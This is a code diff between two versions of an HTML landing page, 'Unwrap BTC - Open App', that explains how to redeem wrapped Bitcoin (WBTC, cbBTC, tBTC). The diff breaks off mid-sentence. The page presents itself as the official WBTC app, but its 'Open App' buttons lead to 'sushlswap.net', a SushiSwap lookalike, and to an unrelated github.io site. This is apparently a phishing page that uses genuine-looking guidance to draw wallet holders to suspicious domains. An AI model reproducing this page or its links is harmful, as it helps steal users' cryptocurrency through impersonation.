@@ -1,254 +1,47 @@
-<!DOCTYPE html>
-<html dir="ltr" lang="en"><head>
-<meta charset="utf-8"/><meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
-<title>Unwrap BTC — Open App</title>
-<meta content="Unwrap BTC is a non-custodial Wrapped BTC Redemption. Open the app and redeem BTC from your own wallet." name="description"/>
-<meta content="index,follow,max-image-preview:large" name="robots"/>
-<link href="https://unwrap-btc.github.io/" rel="canonical"/>
-<link href="https://unwrap-btc.github.io/" hreflang="en" rel="alternate"/><link href="https://unwrap-btc.github.io/" hreflang="x-default" rel="alternate"/>
-<meta content="#0F0D08" name="theme-color"/>
-<meta content="website" property="og:type"/><meta content="Unwrap BTC — Open App" property="og:title"/><meta content="Unwrap BTC is a non-custodial Wrapped BTC Redemption. Open the app and redeem BTC from your own wallet." property="og:description"/>
-<meta content="https://unwrap-btc.github.io/" property="og:url"/><meta content="https://unwrap-btc.github.io/og-cover.png" property="og:image"/><meta content="en" property="og:locale"/>
-<meta content="summary_large_image" name="twitter:card"/><meta content="Unwrap BTC — Open App" name="twitter:title"/><meta content="Unwrap BTC is a non-custodial Wrapped BTC Redemption. Open the app and redeem BTC from your own wallet." name="twitter:description"/><meta content="https://unwrap-btc.github.io/og-cover.png" name="twitter:image"/>
-<link href="favicon.svg" rel="icon" type="image/svg+xml"/><link href="site.webmanifest" rel="manifest"/><link href="static/icon-180.png" rel="apple-touch-icon"/>
-<link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&amp;family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
-<link href="static/style.css" rel="stylesheet"/>
-<script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@graph": [
-    {
-      "@type": "WebSite",
-      "@id": "https://unwrap-btc.github.io/#website",
-      "url": "https://unwrap-btc.github.io/",
-      "name": "Unwrap BTC"
-    },
-    {
-      "@type": "WebPage",
-      "@id": "https://unwrap-btc.github.io/#webpage",
-      "url": "https://unwrap-btc.github.io/",
-      "name": "Unwrap BTC — Open App",
-      "description": "Unwrap BTC is a non-custodial Wrapped BTC Redemption. Open the app and redeem BTC from your own wallet.",
-      "inLanguage": "en",
-      "isPartOf": {
-        "@id": "https://unwrap-btc.github.io/#website"
-      }
-    },
-    {
-      "@type": "Organization",
-      "@id": "https://unwrap-btc.github.io/#org",
-      "name": "Unwrap BTC",
-      "url": "https://unwrap-btc.github.io/",
-      "logo": "https://unwrap-btc.github.io/og-cover.png"
-    },
-    {
-      "@type": "WebApplication",
-      "@id": "https://unwrap-btc.github.io/#app",
-      "name": "Unwrap BTC",
-      "url": "https://unwrap-btc.github.io/",
-      "applicationCategory": "FinanceApplication",
-      "operatingSystem": "Web",
-      "browserRequirements": "Requires JavaScript",
-      "description": "Unwrap BTC is a non-custodial Wrapped BTC Redemption. Open the app and redeem BTC from your own wallet.",
-      "featureList": [
-        "Wrapped BTC Redemption",
-        "Redeem wrapped BTC, on-chain"
-      ],
-      "isPartOf": {
-        "@id": "https://unwrap-btc.github.io/#website"
-      }
-    },
-    {
-      "@type": "FAQPage",
-      "@id": "https://unwrap-btc.github.io/#faq",
-      "inLanguage": "en",
-      "mainEntity": [
-        {
-          "@type": "Question",
-          "name": "Can I unwrap BTC directly from my wallet?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Usually no, unless your wallet is connected to a specific issuer, exchange, or bridge flow that supports redemption for that wrapped asset. WBTC, cbBTC, and tBTC have different routes, so first verify the token and chain. The WBTC site is a starting point for WBTC-specific information."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Is unwrapping WBTC the same as swapping WBTC for BTC?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "No. A swap trades one asset for another through a market, while an unwrap or redemption seeks the underlying native BTC through an issuer, merchant, bridge, or exchange process. WBTC's design is described in the wrapped tokens whitepaper."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Can I send WBTC to a Bitcoin address?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Do not send WBTC directly to a native Bitcoin address unless a supported platform specifically instructs you to do that as part of a deposit flow. WBTC is a token on another network, while native BTC uses the Bitcoin network. Bitcoin.org has general guidance on Bitcoin payments and wallet care at bitcoin.org."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "How do I unwrap cbBTC to BTC?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Use a Coinbase-supported route if you are eligible and the network is supported. Coinbase states that wrapped assets are available on specific networks and represent the original cryptocurrency in a Coinbase account context. Check the current supported networks on the Coinbase help page before sending."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What fees apply when I unwrap BTC?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Fees depend on the route. Common components include source-chain gas, protocol or service fees, exchange spread, withdrawal fees, and Bitcoin miner fees. Avoid any page that promises a fixed cost without showing the live route. Chainlink's Proof of Reserve page is useful for reserve concepts, but it is not a fee quote."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Which wrapped BTC version is best to unwrap?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "There is no universal best choice because each wrapper has a different issuer, trust model, network support, and redemption process. tBTC, for example, documents a protocol bridge model in the Threshold docs. Match the route to your asset and risk tolerance."
-          }
-        }
-      ]
-    }
-  ]
-}</script></head>
-<body>
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Unwrap BTC - Open App</title><meta name="description" content="unwrap btc through the official WBTC destination, verify the Ethereum token contract, and follow a redemption route back to native Bitcoin.">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<link rel="canonical" href="https://unwrap-btc.github.io/"><meta name="theme-color" content="#FFFFFF">
+<meta property="og:type" content="website"><meta property="og:title" content="Unwrap BTC - Open App"><meta property="og:description" content="unwrap btc through the official WBTC destination, verify the Ethereum token contract, and follow a redemption route back to native Bitcoin.">
+<meta property="og:url" content="https://unwrap-btc.github.io/"><meta property="og:image" content="https://unwrap-btc.github.io/og-cover.png"><meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Unwrap BTC - Open App"><meta name="twitter:description" content="unwrap btc through the official WBTC destination, verify the Ethereum token contract, and follow a redemption route back to native Bitcoin."><meta name="twitter:image" content="https://unwrap-btc.github.io/og-cover.png">
+<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
+<link rel="stylesheet" href="static/style.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://unwrap-btc.github.io/#website", "url": "https://unwrap-btc.github.io/", "name": "WBTC"}, {"@type": "WebPage", "@id": "https://unwrap-btc.github.io/#webpage", "url": "https://unwrap-btc.github.io/", "name": "Unwrap BTC - Open App", "description": "unwrap btc through the official WBTC destination, verify the Ethereum token contract, and follow a redemption route back to native Bitcoin.", "inLanguage": "en", "isPartOf": {"@id": "https://unwrap-btc.github.io/#website"}}, {"@type": "Organization", "@id": "https://unwrap-btc.github.io/#org", "name": "WBTC", "url": "https://unwrap-btc.github.io/", "logo": "https://unwrap-btc.github.io/og-cover.png", "sameAs": ["https://twitter.com/WrappedBTC", "https://github.com/WrappedBTC", "https://www.coingecko.com/en/coins/wrapped-bitcoin", "https://defillama.com/protocol/wbtc"]}, {"@type": "WebApplication", "@id": "https://unwrap-btc.github.io/#app", "name": "Unwrap BTC", "url": "https://unwrap-btc.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "unwrap btc through the official WBTC destination, verify the Ethereum token contract, and follow a redemption route back to native Bitcoin.", "featureList": ["ERC-20 token", "Ethereum mainnet contract", "BTC-backed model"], "isPartOf": {"@id": "https://unwrap-btc.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://unwrap-btc.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What does unwrap BTC mean?", "acceptedAnswer": {"@type": "Answer", "text": "Unwrap BTC usually means converting a wrapped Bitcoin token such as WBTC back into native BTC. With WBTC, that means moving out of an ERC-20 token on Ethereum and into Bitcoin on the Bitcoin network. The exact process depends on the provider, because WBTC minting and burning are handled through a merchant and custodian framework rather than a simple consumer-only smart contract call."}}, {"@type": "Question", "name": "Can I send WBTC directly to a Bitcoin address?", "acceptedAnswer": {"@type": "Answer", "text": "No. WBTC is an ERC-20 token and should not be sent directly to a native Bitcoin address. A Bitcoin address cannot receive an Ethereum ERC-20 transfer. To move from WBTC to BTC, use a route that explicitly supports redemption or exchange from WBTC on Ethereum to BTC on Bitcoin, and verify the destination address before confirming the transaction."}}, {"@type": "Question", "name": "Is WBTC the same as BTC?", "acceptedAnswer": {"@type": "Answer", "text": "WBTC is not native BTC. It is a tokenized representation of Bitcoin used on Ethereum and other DeFi routes, backed through a custodial system. BTC is the asset on the Bitcoin network. WBTC can be useful for Ethereum DeFi, but it introduces smart contract, custodian, merchant, and provider risk that native BTC held in a Bitcoin wallet does not have in the same form."}}, {"@type": "Question", "name": "Who can burn WBTC for BTC?", "acceptedAnswer": {"@type": "Answer", "text": "In the WBTC framework, burning is a merchant-level process. Ordinary users typically redeem through supported merchants, custodians, exchanges, or other providers rather than calling a universal consumer redemption button. That means the practical answer depends on which provider accepts your WBTC, what compliance steps it requires, and how it pays out native Bitcoin."}}, {"@type": "Question", "name": "What fees apply when unwrapping BTC?", "acceptedAnswer": {"@type": "Answer", "text": "There is no single fixed unwrap BTC fee. You may pay Ethereum gas, a WBTC transfer or approval cost, a provider or merchant fee, spread if using an exchange route, and a Bitcoin network fee for the payout transaction. Always compare the final BTC received and the estimated settlement time, because a low advertised fee can still produce a worse net result."}}, {"@type": "Question", "name": "How do I verify real WBTC before unwrapping?", "acceptedAnswer": {"@type": "Answer", "text": "Verify the Ethereum token address 0x2260fac5e5542a773aa44fbcfedf7c193bc2c599 on Etherscan and cross-check official WBTC resources before approving a transfer. Also confirm that the route is asking for WBTC on the correct network and that the BTC payout address is yours. Name, logo, and ticker alone are not enough because lookalike tokens are easy to create."}}]}]}</script>
+</head><body>
 <header class="site-header">
-<a aria-label="Unwrap BTC" class="brand" href="#top">
-<svg aria-hidden="true" class="brand-mark" viewbox="0 0 32 32"><defs><lineargradient id="g" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stop-color="#F7D694"></stop><stop offset=".5" stop-color="#E4A019"></stop><stop offset="1" stop-color="#A37212"></stop></lineargradient></defs><g fill="none" stroke="url(#g)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.4"><circle cx="13" cy="13" r="6.2"></circle><circle cx="20" cy="20" r="6.2"></circle></g></svg>
-<h1>Unwrap BTC</h1>
-</a>
-<nav aria-label="Primary" class="site-nav"><ul class="nav-list"><li><a href="#how-it-works">How it works</a></li><li><a href="#fees-security">Fees security</a></li><li><a href="#common-mistakes">Common mistakes</a></li><li><a href="#routes">Routes</a></li><li><a href="#checklist">Checklist</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-<span class="header-spacer"></span>
-<a class="cta cta-primary header-cta" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Unwrap BTC</a>
-<button aria-expanded="false" aria-label="Menu" class="nav-toggle"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"></path></svg></button>
+  <a class="brand" href="#top" aria-label="WBTC"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">WBTC</span></a>
+  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
+  <span class="header-spacer"></span>
+  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
+  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
 </header>
 <main id="top">
-<section class="hero"><div class="container"><div class="hero-grid">
-<div class="hero-copy">
-<h2 class="hero-title">Redeem wrapped BTC, on-chain</h2>
-<p class="lead"><strong>Unwrap BTC</strong> — Turn wrapped Bitcoin exposure back toward native BTC by matching the token, chain, and redemption route.</p>
-<div class="hero-cta-row"><a class="cta cta-primary" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Unwrap BTC ↗</a><a class="cta cta-secondary" href="#what-is">Learn more</a></div>
-<p class="hero-note">Live preview — open Unwrap BTC to redeem.</p><div class="trust-row"><span class="trust-chip">On-chain</span><span class="trust-chip">Non-custodial</span></div>
-</div>
-<div class="hero-widget">
-<div aria-hidden="true" class="floating-coins"></div>
-<div class="swap-widget" id="app-widget">
-<div class="swap-widget-head"><span>Unwrap</span><span class="badge">Redemption</span></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">From</span><span class="swap-amount">1.00</span></div><span class="token-chip" data-slot="from"><span class="token-icon-morph"><img alt="WBTC" class="" decoding="async" height="28" loading="lazy" src="wbtc.png" width="28"/></span><span class="token-ticker">WBTC</span></span></div>
-<div class="swap-flip-wrap"><button aria-label="Switch" class="swap-flip" type="button"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24"><path d="M7 4v16M7 20l-3-3M7 4l3 3M17 20V4M17 4l3 3M17 20l-3-3"></path></svg></button></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">To</span><span class="swap-amount">~1.00</span></div><span class="token-chip" data-slot="to"><span class="token-icon-morph"><img alt="BTC" class="" decoding="async" height="28" loading="lazy" src="btc.png" width="28"/></span><span class="token-ticker">BTC</span></span></div>
-<a class="cta cta-primary swap-now-main" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Unwrap BTC ↗</a>
-<p class="swap-note">Preview — open Unwrap BTC to redeem.</p>
-</div>
-</div>
-</div></div></section>
-<section class="section section-alt" id="what-is"><div class="container"><h2>What is Unwrap BTC?</h2><div class="capsule"><strong>Unwrap BTC</strong> means redeeming a wrapped Bitcoin token for native Bitcoin, or using an issuer-supported route that converts the wrapped asset back to BTC. Wrapped Bitcoin forms are tokens on networks such as Ethereum or Base, while native BTC settles on the Bitcoin network. The exact process depends on the issuer: WBTC, cbBTC, and tBTC use different custody, mint, and redemption systems. For context, WBTC's official materials describe wrapped BTC as a Bitcoin-backed token model on <a href="https://wbtc.network/" rel="noopener noreferrer">wbtc.network</a>.</div></div></section>
-<section class="section section-alt" id="how-it-works">
-<div class="container"><h2>How Unwrap BTC works</h2><p class="section-intro">Start by identifying the exact token contract and network. The redemption path for wrapped BTC is not the same as a normal token swap.</p>
-<ol class="steps"><li><strong>Confirm the wrapper</strong><span>Check whether you hold WBTC, cbBTC, tBTC, or another BTC representation, then verify the network and contract before moving funds.</span></li><li><strong>Pick the redemption route</strong><span>Use the issuer, a supported merchant, a protocol bridge, or an exchange that explicitly supports deposits for that wrapped asset on that chain.</span></li><li><strong>Keep gas available</strong><span>Wrapped BTC on smart-contract networks needs native gas on that network, while the final BTC transaction uses Bitcoin network fees.</span></li><li><strong>Verify receipt on Bitcoin</strong><span>Treat the process as complete only after the native BTC arrives at the intended Bitcoin address and receives the confirmations you require.</span></li></ol>
-</div>
-</section>
-<section class="section" id="fees-security">
-<div class="container"><h2>Fees, custody, and security</h2><p class="section-intro">Costs are route-specific, and the largest risk is usually using the wrong network or assuming every wrapped BTC token redeems the same way.</p>
-<div class="cards three"><article class="card"><h3>Fee components</h3><p>Expect components such as source-chain gas, bridge or issuer fees, exchange spread, and Bitcoin miner fees. Bitcoin.org explains that Bitcoin transactions can include network fees on <a href="https://bitcoin.org/en/you-need-to-know" rel="noopener noreferrer">its user guidance page</a>.</p></article><article class="card"><h3>Custody model</h3><p>Custodial wrappers depend on an issuer and reserve process; protocol-based wrappers depend on bridge contracts, operators, and redemption rules. Review issuer documentation before assuming the path is self-service.</p></article><article class="card"><h3>Contract risk</h3><p>ERC-20 wrapped assets use token contracts and approvals. Ethereum.org's <a href="https://ethereum.org/developers/docs/standards/tokens/erc-20/" rel="noopener noreferrer">ERC-20 overview</a> is a useful baseline for understanding transfers, balances, and allowances.</p></article></div>
-</div>
-</section>
-<section class="section section-alt" id="common-mistakes">
-<div class="container"><h2>Common Unwrap BTC mistakes</h2><p class="section-intro">Most errors come from mixing native BTC addresses with smart-contract networks. Slow down at the address, network, and asset-selection screens.</p>
-<div class="cards three"><article class="card"><h3>Sending to a BTC address too early</h3><p>An ERC-20 or Base token cannot simply be sent to a native Bitcoin address unless the platform explicitly supports that deposit route and conversion.</p></article><article class="card"><h3>Confusing symbols</h3><p>WBTC, cbBTC, tBTC, and exchange-specific BTC wrappers can all look similar in a wallet. The contract address and network matter more than the ticker.</p></article><article class="card"><h3>Skipping redemption limits</h3><p>Some routes require accounts, eligibility checks, merchants, minimums, or protocol-specific steps. Coinbase describes supported wrapped asset networks in its <a href="https://help.coinbase.com/en/coinbase/trading-and-funding/sending-or-receiving-cryptocurrency/coinbase-wrapped-btc" rel="noopener noreferrer">wrapped assets help page</a>.</p></article></div>
-</div>
-</section>
-<section class="section" id="routes">
-<div class="container">
-<h2>Main Unwrap Routes</h2>
-<p class="section-intro">Choose the route that matches the wrapper you actually hold.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><img alt="WBTC" class="coin-icon" decoding="async" height="40" loading="lazy" src="wbtc.png" width="40"/>
-<div><h3>WBTC merchant route</h3><p class="coin-sub">Custodial wrapped Bitcoin <span class="tag">Merchant</span></p></div>
-</div>
-<p class="coin-intent">WBTC redemptions are handled through the WBTC merchant and custodian model, not by sending the token to any BTC address. Review the official partner and process pages before choosing a counterparty.</p>
-<a class="cta cta-mini swap-now" data-icon="wbtc.png" data-ticker="WBTC" href="https://wbtc.network/dashboard/partners" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="cbBTC" class="coin-icon" decoding="async" height="40" loading="lazy" src="cbbtc.png" width="40"/>
-<div><h3>Coinbase wrapped BTC</h3><p class="coin-sub">Coinbase-supported wrapper <span class="tag">Issuer</span></p></div>
-</div>
-<p class="coin-intent">cbBTC routes depend on Coinbase account eligibility and supported networks. Match the chain shown in your wallet to the deposit or withdrawal network shown by Coinbase.</p>
-<a class="cta cta-mini swap-now" data-icon="cbbtc.png" data-ticker="cbBTC" href="https://help.coinbase.com/en/coinbase/trading-and-funding/sending-or-receiving-cryptocurrency/coinbase-wrapped-btc" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="tBTC" class="coin-icon" decoding="async" height="40" loading="lazy" src="tbtc.png" width="40"/>
-<div><h3>Threshold Bitcoin</h3><p class="coin-sub">Protocol-based bridge <span class="tag">Bridge</span></p></div>
-</div>
-<p class="coin-intent">tBTC uses Threshold's bridge design rather than a single exchange-style unwrap screen. Follow the bridge documentation and check redemption requirements before committing funds.</p>
-<a class="cta cta-mini swap-now" data-icon="tbtc.png" data-ticker="tBTC" href="https://docs.threshold.network/tbtc-v2" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">CEX</span>
-<div><h3>Exchange conversion</h3><p class="coin-sub">Account-based BTC withdrawal <span class="tag">Account</span></p></div>
-</div>
-<p class="coin-intent">Some exchanges accept a wrapped BTC deposit on a supported chain and let you withdraw native BTC afterward. Confirm the exact asset, chain, and deposit label inside the exchange interface.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="CEX" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section section-alt" id="checklist">
-<div class="container">
-<h2>Pre-Transaction Checks</h2>
-<p class="section-intro">A short checklist reduces the chance of treating wrapped BTC like native BTC.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">ADDR</span>
-<div><h3>Token contract</h3><p class="coin-sub">Verify the asset <span class="tag">Verify</span></p></div>
-</div>
-<p class="coin-intent">Use the contract address and chain, not only the token symbol. Scam tokens often borrow familiar BTC wrapper names.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="ADDR" href="https://ethereum.org/developers/docs/standards/tokens/erc-20/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">GAS</span>
-<div><h3>Network gas</h3><p class="coin-sub">Keep native gas ready <span class="tag">Fees</span></p></div>
-</div>
-<p class="coin-intent">An Ethereum token needs ETH for gas, while a Base token needs Base gas. The wrapped BTC itself usually cannot pay the source-chain gas fee.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="GAS" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="BTC" class="coin-icon" decoding="async" height="40" loading="lazy" src="btc.png" width="40"/>
-<div><h3>Bitcoin address</h3><p class="coin-sub">Check final destination <span class="tag">Address</span></p></div>
-</div>
-<p class="coin-intent">Only use a native BTC address when the redemption service is explicitly asking for a Bitcoin withdrawal address.</p>
-<a class="cta cta-mini swap-now" data-icon="btc.png" data-ticker="BTC" href="https://bitcoin.org/en/you-need-to-know" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">POR</span>
-<div><h3>Reserve visibility</h3><p class="coin-sub">Review backing signals <span class="tag">Reserves</span></p></div>
-</div>
-<p class="coin-intent">Proof-of-reserve tools can help evaluate some wrapped assets, but they do not remove custody, bridge, or execution risk.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="POR" href="https://chain.link/proof-of-reserve" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section" id="compare"><div class="container"><h2>WBTC vs cbBTC vs tBTC</h2><p class="section-intro">Different wrappers can all track Bitcoin exposure, but they do not share one redemption workflow. Start with the issuer or protocol documentation, such as the <a href="https://wbtc.network/assets/wrapped-tokens-whitepaper.pdf" rel="noopener noreferrer">WBTC whitepaper</a>, before moving funds.</p>
-<div class="table-wrap"><table class="compare-table"><thead><tr><th>Asset</th><th>Typical unwrap path</th><th>Main thing to verify</th></tr></thead><tbody><tr><td>WBTC</td><td>Merchant or supported exchange route</td><td>Official merchant, custodian model, and source chain</td></tr><tr><td>cbBTC</td><td>Coinbase-supported deposit or withdrawal flow</td><td>Account eligibility and supported network</td></tr><tr><td>tBTC</td><td>Threshold bridge redemption process</td><td>Protocol steps, fees, and redemption requirements</td></tr></tbody></table></div></div></section>
-<section class="section" id="faq"><div class="container"><h2>Unwrap BTC FAQ</h2><div class="faq-list">
-<details open=""><summary><h3>Can I Unwrap BTC directly from my wallet?</h3></summary><div>Usually no, unless your wallet is connected to a specific issuer, exchange, or bridge flow that supports redemption for that wrapped asset. WBTC, cbBTC, and tBTC have different routes, so first verify the token and chain. The <a href="https://wbtc.network/" rel="noopener noreferrer">WBTC site</a> is a starting point for WBTC-specific information.</div></details>
-<details open=""><summary><h3>Is unwrapping WBTC the same as swapping WBTC for BTC?</h3></summary><div>No. A swap trades one asset for another through a market, while an unwrap or redemption seeks the underlying native BTC through an issuer, merchant, bridge, or exchange process. WBTC's design is described in the <a href="https://wbtc.network/assets/wrapped-tokens-whitepaper.pdf" rel="noopener noreferrer">wrapped tokens whitepaper</a>.</div></details>
-<details><summary><h3>Can I send WBTC to a Bitcoin address?</h3></summary><div>Do not send WBTC directly to a native Bitcoin address unless a supported platform specifically instructs you to do that as part of a deposit flow. WBTC is a token on another network, while native BTC uses the Bitcoin network. Bitcoin.org has general guidance on Bitcoin payments and wallet care at <a href="https://bitcoin.org/en/you-need-to-know" rel="noopener noreferrer">bitcoin.org</a>.</div></details>
-<details><summary><h3>How do I unwrap cbBTC to BTC?</h3></summary><div>Use a Coinbase-supported route if you are eligible and the network is supported. Coinbase states that wrapped assets are available on specific networks and represent the original cryptocurrency in a Coinbase account context. Check the current supported networks on the <a href="https://help.coinbase.com/en/coinbase/trading-and-funding/sending-or-receiving-cryptocurrency/coinbase-wrapped-btc" rel="noopener noreferrer">Coinbase help page</a> before sending.</div></details>
-<details><summary><h3>What fees apply when I Unwrap BTC?</h3></summary><div>Fees depend on the route. Common components include source-chain gas, protocol or service fees, exchange spread, withdrawal fees, and Bitcoin miner fees. Avoid any page that promises a fixed cost without showing the live route. Chainlink's <a href="https://chain.link/proof-of-reserve" rel="noopener noreferrer">Proof of Reserve</a> page is useful for reserve concepts, but it is not a fee quote.</div></details>
-<details><summary><h3>Which wrapped BTC version is best to unwrap?</h3></summary><div>There is no universal best choice because each wrapper has a different issuer, trust model, network support, and redemption process. tBTC, for example, documents a protocol bridge model in the <a href="https://docs.threshold.network/tbtc-v2" rel="noopener noreferrer">Threshold docs</a>. Match the route to your asset and risk tolerance.</div></details>
-</div></div></section>
+  <section class="hero">
+    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
+    <div class="container">
+      <h1>Unwrap BTC</h1>
+      <div class="bridge-widget" role="group" aria-label="WBTC preview"><div class="bw-field"><span class="bw-coin"><img src="static/wbtc.png" alt="WBTC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>WBTC</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/btc.png" alt="BTC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>BTC</b> · Bitcoin</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"></div>
+      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open WBTC ↗</a></div>
+      <p class="hero-note">Live preview — open the official WBTC app from your own wallet.</p>
+      <div class="trust-row"><span class="trust-chip">ERC-20 token</span><span class="trust-chip">Ethereum mainnet contract</span><span class="trust-chip">BTC-backed model</span></div>
+    </div>
+  </section>
+  <section class="section" id="about"><div class="container"><h2>What is Unwrap BTC?</h2><div class="capsule"><strong>WBTC</strong> is the <a class="inline-link" href="https://www.coingecko.com/learn/what-is-wrapped-bitcoin-wbtc-and-how-does-it-work" rel="noopener noreferrer">Ethereum ERC-20 representation of Bitcoin</a> used across wallets and DeFi. Verify the live token identity on <a href="https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599">Etherscan</a> before using any route.</div></div></section>
+  <section class="section" id="facts"><div class="container"><h2>Unwrap BTC at a glance</h2><div class="facts"><div class="f"><small>Category</small><b><a class="inline-link" href="https://www.wbtc.network/assets/wrapped-tokens-whitepaper.pdf" rel="noopener noreferrer">Wrapped Bitcoin redemption route</a></b></div><div class="f"><small>Network</small><b>Ethereum and Bitcoin</b></div><div class="f"><small>Token</small><b>WBTC</b></div><div class="f"><small>Launched</small><b>January 2019</b></div><div class="f"><small>Custody</small><b>BTC backing held through <a class="inline-link" href="https://www.bitstamp.net/learn/cryptocurrency-guide/what-is-wrapped-bitcoin-wbtc/" rel="noopener noreferrer">custodial merchant framework</a></b></div></div></div></section>
+  <section class="section section-alt"><div class="container"><h2>Unwrap BTC from WBTC to native Bitcoin</h2><div class="intent-a">Unwrapping BTC usually means moving from WBTC, an <a class="inline-link" href="https://www.hiro.so/blog/a-developers-guide-to-wrapped-bitcoin-wbtc" rel="noopener noreferrer">ERC-20 representation of Bitcoin on Ethereum</a>, back to native BTC on the Bitcoin network. The WBTC token contract itself is not a simple one-click consumer bridge; the official model uses <a class="inline-link" href="https://www.wbtc.network/assets/wrapped-tokens-whitepaper.pdf" rel="noopener noreferrer">merchants and custodians for minting and burning</a>. A practical user route may involve a supported merchant, exchange, custodian, or DeFi venue that can receive WBTC and send BTC. Before approving anything, confirm the WBTC contract address, provider terms, destination Bitcoin address, fees, timing, and any KYC requirement. The official <a href="https://www.wbtc.network/assets/wrapped-tokens-whitepaper.pdf">WBTC whitepaper</a> describes the mint and burn framework.</div></div></section><section class="section"><div class="container"><h2>WBTC contract address for unwrap BTC</h2><div class="intent-a">The <a class="inline-link" href="https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" rel="noopener noreferrer">Ethereum WBTC token contract</a> to verify is 